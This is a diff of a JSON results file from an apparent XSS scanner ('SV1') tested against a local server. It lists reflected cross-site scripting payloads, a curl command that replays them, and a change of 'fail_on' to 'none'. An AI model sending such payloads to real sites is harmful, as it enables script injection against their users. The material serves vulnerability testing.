@@ -1,7 +1,7 @@
 {
   "tool": "SV1",
   "author": "ee.zvz",
-  "version": "1.3.0",
+  "version": "1.3.1",
   "meta": {
     "target": "http://127.0.0.1:8099/api/nested",
     "crawl": false,
@@ -28,7 +28,7 @@
     "blind": false,
     "ssrf": false,
     "oob": "",
-    "fail_on": "any",
+    "fail_on": "none",
     "scope": "",
     "db": "",
     "sarif": "",
@@ -61,20 +61,20 @@
       "url": "http://127.0.0.1:8099/api/nested",
       "method": "POST",
       "param": "user.name",
-      "payload": "<svg/onload=alert('sv1e8f676b1')>sv1e8f676b1",
+      "payload": "<svg/onload=alert('sv1e0995d57')>sv1e0995d57",
       "confidence": "MEDIUM",
-      "evidence": "<html><body><h1>api body</h1><div><svg/onload=alert('sv1e8f676b1')>sv1e8f676b1</div></body></html>",
+      "evidence": "<html><body><h1>api body</h1><div><svg/onload=alert('sv1e0995d57')>sv1e0995d57</div></body></html>",
       "technique": "reflected/text",
       "detail": "reflection confirmed; execution not yet proven (in HTML text flow) | reflection only: chromium unavailable",
       "artifact": "",
-      "curl": "curl -sS -X POST -H 'Content-Type: application/json' --data-raw '{\"user\":{\"name\":\"<svg/onload=alert('\"'\"'sv1e8f676b1'\"'\"')>sv1e8f676b1\"},\"q\":\"test\"}' http://127.0.0.1:8099/api/nested",
+      "curl": "curl -sS -X POST -H 'Content-Type: application/json' --data-raw '{\"user\":{\"name\":\"<svg/onload=alert('\"'\"'sv1e0995d57'\"'\"')>sv1e0995d57\"},\"q\":\"hello\"}' http://127.0.0.1:8099/api/nested",
       "data": {},
       "alternatives": [
-        "<img src=x onerror=alert('sv1e8f676b1')>sv1e8f676b1",
-        "<script>alert('sv1e8f676b1')</script>sv1e8f676b1",
-        "sv1e8f676b1\"><svg/onload=alert('sv1e8f676b1')>",
-        "sv1e8f676b1'><svg/onload=alert('sv1e8f676b1')>",
-        "sv1e8f676b1</title><svg/onload=alert('sv1e8f676b1')>"
+        "<img src=x onerror=alert('sv1e0995d57')>sv1e0995d57",
+        "<script>alert('sv1e0995d57')</script>sv1e0995d57",
+        "sv1e0995d57\"><svg/onload=alert('sv1e0995d57')>",
+        "sv1e0995d57'><svg/onload=alert('sv1e0995d57')>",
+        "sv1e0995d57</title><svg/onload=alert('sv1e0995d57')>"
       ]
     }
   ]
